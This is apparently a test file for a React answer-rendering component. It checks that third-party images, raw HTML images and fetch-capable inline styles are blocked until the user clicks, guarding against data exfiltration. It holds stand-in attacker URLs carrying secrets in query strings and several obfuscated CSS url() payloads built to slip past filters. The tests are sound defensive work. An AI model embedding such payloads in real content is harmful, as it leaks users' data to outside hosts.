import React from 'react';
import { describe, it, expect, afterEach, vi } from 'vitest';
import { render, cleanup, fireEvent } from '@testing-library/react';
import { Theme } from '@radix-ui/themes';
import { AnswerContent } from '../answer-content';
import type { CitationMaps } from '../response-tabs/citations';

const mockIsMobile = vi.hoisted(() => ({ value: false }));
vi.mock('@/lib/hooks/use-is-mobile', () => ({ useIsMobile: () => mockIsMobile.value }));

afterEach(() => {
  cleanup();
  mockIsMobile.value = false;
});

const h = React.createElement;

const EMPTY_MAPS: CitationMaps = {
  citations: {},
  sources: {},
  sourcesOrder: [],
  citationsOrder: {},
};

function renderAnswer(content: string, isStreaming = false) {
  return render(
    h(Theme, null, h(AnswerContent, { content, citationMaps: EMPTY_MAPS, isStreaming })),
  );
}

const EXFIL = 'https://attacker.example/pixel.png?q=secret-from-document';

describe('AnswerContent — third-party images need a click to load', () => {
  it('does not render an <img> for a third-party image, so nothing is fetched', () => {
    const { container, getByText } = renderAnswer(`Before\n\n![chart](${EXFIL})\n\nAfter`);

    expect(container.querySelector('img')).toBeNull();
    expect(getByText('External image not loaded')).toBeTruthy();
    expect(getByText('Load image')).toBeTruthy();
    expect(container.innerHTML).not.toContain('secret-from-document');
  });

  it('gives the load button a 44px touch target on mobile only', () => {
    const desktop = renderAnswer(`![chart](${EXFIL})`);
    expect((desktop.getByText('Load image') as HTMLElement).style.minHeight).toBe('');
    cleanup();

    mockIsMobile.value = true;
    const mobile = renderAnswer(`![chart](${EXFIL})`);
    const button = mobile.getByText('Load image') as HTMLElement;
    expect(button.style.minHeight).toBe('44px');
    expect(button.style.minWidth).toBe('44px');
  });

  it('keeps the alt text visible while the image is blocked', () => {
    const { getByText } = renderAnswer(`![quarterly chart](${EXFIL})`);
    expect(getByText('quarterly chart')).toBeTruthy();
  });

  it('loads the image only after the user clicks the button, without sending a referrer', () => {
    const { container, getByText } = renderAnswer(`![chart](${EXFIL})`);

    fireEvent.click(getByText('Load image'));

    const img = container.querySelector('img');
    expect(img).not.toBeNull();
    expect(img!.getAttribute('src')).toBe(EXFIL);
    expect(img!.getAttribute('referrerpolicy')).toBe('no-referrer');
    expect(img!.getAttribute('loading')).toBe('lazy');
    expect(container.textContent).not.toContain('External image not loaded');
  });

  it('treats a protocol-relative URL as third party', () => {
    const { container } = renderAnswer('![x](//attacker.example/pixel.png?q=secret)');
    expect(container.querySelector('img')).toBeNull();
  });

  it('blocks third-party images while the answer is still streaming', () => {
    const { container } = renderAnswer(`![chart](${EXFIL})\n\nmore text`, true);
    expect(container.querySelector('img')).toBeNull();
  });

  it('loads root-relative and same-origin images straight away', () => {
    const sameOrigin = `${window.location.origin}/api/v1/img.png`;
    const { container } = renderAnswer(`![a](/api/v1/img.png)\n\n![b](${sameOrigin})`);

    const srcs = Array.from(container.querySelectorAll('img')).map((i) => i.getAttribute('src'));
    expect(srcs).toEqual(['/api/v1/img.png', sameOrigin]);
    expect(container.textContent).not.toContain('External image not loaded');
  });

  it('asks separately for each third-party image', () => {
    const second = 'https://other.example/b.png';
    const { container, getAllByText } = renderAnswer(`![a](${EXFIL})\n\n![b](${second})`);

    const buttons = getAllByText('Load image');
    expect(buttons).toHaveLength(2);

    fireEvent.click(buttons[0]);

    const imgs = container.querySelectorAll('img');
    expect(imgs).toHaveLength(1);
    expect(imgs[0].getAttribute('src')).toBe(EXFIL);
    expect(getAllByText('Load image')).toHaveLength(1);
  });
});

describe('AnswerContent — the same policy for raw HTML, data: images and inline styles', () => {
  const EVIL = 'https://evil.example/p?d=secret';
  const imgSrcs = (root: HTMLElement) =>
    Array.from(root.querySelectorAll('img')).map((i) => i.getAttribute('src'));

  it('renders relative, same-origin and data: images directly', () => {
    const dataUri = 'data:image/png;base64,iVBORw0KGgo=';
    const sameOrigin = `${window.location.origin}/api/v1/document/d1/download`;
    const { container, queryByTestId } = renderAnswer(
      [
        '![rel](/api/v1/knowledgeBase/stream/record/r1)',
        '',
        `![abs](${sameOrigin})`,
        '',
        `![data](${dataUri})`,
      ].join('\n'),
    );
    expect(imgSrcs(container)).toEqual(['/api/v1/knowledgeBase/stream/record/r1', sameOrigin, dataUri]);
    expect(queryByTestId('remote-image-placeholder')).toBeNull();
  });

  it('gives raw HTML <img> (rehypeRaw path) the same placeholder', () => {
    const { container, getByText } = renderAnswer(`<p>see <img src="${EVIL}" alt="pixel"></p>`);
    expect(imgSrcs(container)).toEqual([]);
    expect(getByText('Load image')).toBeTruthy();
  });

  it.each([
    'background-image:url(https://evil.example/?d=secret)',
    'background:url/**/(https://evil.example/?d=secret)',
    'background:URL(https://evil.example/?d=secret)',
    'background-image:image("https://evil.example/?d=secret")',
    'background-image:image-set("https://evil.example/?d=secret" 1x)',
    'background-image:cross-fade(url(https://evil.example/?d=secret), none)',
    'background:\\75 rl(https://evil.example/?d=secret)',
    'list-style:u/**/rl(https://evil.example/?d=secret)',
  ])('strips an inline style that could fetch: %s', (style) => {
    const { container } = renderAnswer(`<span style='${style}'>x</span> <span style="color:red">y</span>`);
    expect(container.innerHTML).not.toContain('evil.example');
    expect(container.innerHTML).toContain('color: red');
  });
});
